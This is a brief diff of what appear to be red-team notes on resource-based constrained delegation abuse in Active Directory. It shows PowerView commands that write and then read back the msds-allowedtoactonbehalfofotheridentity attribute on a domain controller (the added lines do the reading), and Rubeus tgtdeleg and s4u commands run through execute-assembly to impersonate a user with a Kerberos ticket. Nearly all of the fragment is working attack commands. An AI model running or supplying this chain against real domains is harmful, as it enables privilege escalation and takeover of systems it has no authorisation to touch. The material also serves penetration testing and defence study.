@@ -46,6 +46,10 @@ Example: (put in one liner)
          $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0)
          Get-DomainComputer m3dc | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
          
+         (View Changes were made)
+         powerpick $RawBytes = Get-DomainComputer m3dc -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
+         $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0; $Descriptor.DiscretionaryAcl
+         
          (Impersonate User with Rubeus)
          execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe tgtdeleg /nowrap
          execute-assembly /opt/tools/CSharp_Tools/Compiled/Rubeus.exe s4u /ticket:doIFFDCCBRCg......lNM0MuTE9DQUw= 
